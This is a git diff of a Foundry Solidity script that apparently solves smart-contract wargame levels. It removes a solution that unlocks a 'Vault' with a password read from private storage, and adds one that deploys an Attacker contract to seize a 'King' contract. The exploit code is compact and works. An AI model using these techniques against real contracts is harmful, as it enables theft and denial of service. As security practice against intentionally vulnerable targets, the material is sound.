@@ -2,7 +2,7 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Script.sol";
-import "../src/Contract.sol";
+import "../src/Attacker.sol";
 import "forge-std/console.sol";
 
 contract AttackScript is Script {
@@ -11,14 +11,22 @@ contract AttackScript is Script {
     //solveed by using the selfdestruct() to send ether to another contract
     function run() public {
         vm.startBroadcast();
-        //using the passowrd value read at storage call the unlock function to unlock vault
-        //await web3.eth.getStorageAt('0x6E2FE149DEe227A1ACB05c6c929789007e866609', 1) --> do in js
-        bytes32 password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
+        King kingContract = King(
+            payable(0x1d65AB46D84e509D4Df3a3d518A0dA52a1c19460)
+        );
 
-        Vault vault = Vault(0x6E2FE149DEe227A1ACB05c6c929789007e866609);
-        vault.unlock(password);
-        
-        console.log('variable locked is', vault.locked());
+        //create attacker
+        Attacker attacker = new Attacker(kingContract);
+
+        (bool success, ) = address(attacker).call{
+            value: kingContract.prize() + 1000 wei
+        }("");
+        require(success == true, "script failed");
+
+        // call attack fcn
+        attacker.attack();
+
+        console.log('new king is', kingContract._king());
         vm.stopBroadcast();
     }
 }
